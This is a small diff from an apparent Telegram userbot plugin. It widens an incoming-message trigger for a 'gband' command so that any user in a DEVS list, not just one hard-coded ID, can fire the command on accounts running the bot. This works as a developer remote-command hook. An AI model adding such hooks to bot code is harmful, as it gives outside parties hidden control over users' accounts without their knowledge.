@@ -42,7 +42,7 @@ async def handler(tele):
 
 
 @bot.on(man_cmd(outgoing=True, pattern=r"gband(?: |$)(.*)"))
-@register(incoming=True, from_users=1905050903, pattern=r"^\.cgband(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgband(?: |$)(.*)")
 async def gben(userbot):
     dc = userbot
     sender = await dc.get_sender()
